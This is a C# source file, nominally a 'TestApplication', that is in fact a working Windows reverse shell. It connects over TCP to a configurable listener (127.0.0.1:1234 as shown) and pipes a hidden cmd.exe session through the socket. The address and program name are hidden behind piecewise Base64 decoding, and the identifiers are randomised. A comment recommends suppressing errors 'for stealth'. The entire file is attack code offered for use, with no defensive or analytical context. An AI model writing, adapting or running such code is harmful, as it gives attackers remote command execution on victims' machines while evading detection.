using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;

namespace TestApplication
{
    class C_YXpUjY
    {
        static void Main(string[] P_ZOCbLs)
        {
            // Change this to the remote listener's IP if needed
            string V_plmFld = M_mgbkf("MQ==") + M_mgbkf("Mg==") + M_mgbkf("Nw==") + M_mgbkf("Lg==") + M_mgbkf("MC4wLjE=");
            int V_fBQtZA = 1234;
            using (TcpClient V_VWAbbL = new TcpClient())
            {
                try
                {
                    V_VWAbbL.Connect(V_plmFld, V_fBQtZA);
                    using (NetworkStream V_PlASsw = V_VWAbbL.GetStream())
                    {
                        // Start cmd.exe with redirected streams
                        Process V_EAsPdD = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = M_mgbkf("Yw==") + M_mgbkf("bQ==") + M_mgbkf("ZA==") + M_mgbkf("Lg==") + M_mgbkf("ZXhl"),
                                RedirectStandardInput = true,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            }
                        };
                        V_EAsPdD.Start();
                        // Thread: stdin of this process → network
                        new Thread(() =>
                        {
                            try
                            {
                                StreamReader V_PRAoLL = V_EAsPdD.StandardOutput;
                                StreamReader V_ZPSpAP = V_EAsPdD.StandardError;
                                StreamWriter V_QQzjqC = new StreamWriter(V_PlASsw)
                                {
                                    AutoFlush = true
                                };
                                string V_uFKavi;
                                while ((V_uFKavi = V_PRAoLL.ReadLine()) != null)
                                {
                                    V_QQzjqC.WriteLine(V_uFKavi);
                                }

                                while ((V_uFKavi = V_ZPSpAP.ReadLine()) != null)
                                {
                                    V_QQzjqC.WriteLine(V_uFKavi);
                                }
                            }
                            catch
                            {
                            }
                        })
                        {
                            IsBackground = true
                        }.Start();
                        // Main thread: network → stdin of cmd.exe
                        using (StreamReader V_hXpHNw = new StreamReader(V_PlASsw))
                        using (StreamWriter V_twdnQj = V_EAsPdD.StandardInput)
                        {
                            string V_jEDptT;
                            while ((V_jEDptT = V_hXpHNw.ReadLine()) != null)
                            {
                                V_twdnQj.WriteLine(V_jEDptT);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Could not connect or I/O error
                    // For stealth, you might suppress this; but for debugging:
                    Console.Error.WriteLine($"[!] Error: {ex.Message}");
                }
            }
        }

        private static string M_mgbkf(string V_homft)
        {
            if (string.IsNullOrEmpty(V_homft))
                return string.Empty;
            byte[] V_xkgpd = Convert.FromBase64String(V_homft);
            return System.Text.Encoding.UTF8.GetString(V_xkgpd);
        }
    }
}